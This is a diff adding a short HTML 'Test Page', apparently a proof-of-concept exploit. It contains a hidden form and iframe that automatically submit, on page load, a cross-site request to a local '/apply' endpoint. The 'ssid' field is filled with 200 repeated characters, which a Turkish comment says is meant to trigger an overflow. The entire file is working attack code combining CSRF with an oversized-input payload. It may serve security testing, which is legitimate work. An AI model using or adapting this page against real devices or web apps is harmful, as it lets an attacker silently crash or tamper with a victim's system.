@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Test Page</title>
+</head>
+<body>
+  <h2>Test web sayfası</h2>
+
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <!-- CSRF form -->
+  <form id="csrfForm"
+        action="http://127.0.0.1:5000/apply"
+        method="POST"
+        target="hiddenFrame"
+        style="display:none;">
+    <input type="hidden" name="ssid" id="payload">
+  </form>
+
+  <script>
+    // overflow tetiklemek için payload
+    var payload = "A".repeat(200);
+
+    document.getElementById("payload").value = payload;
+
+    // sayfa yüklenince otomatik gönder
+    window.onload = function() {
+      document.getElementById("csrfForm").submit();
+    };
+  </script>
+</body>
+</html>
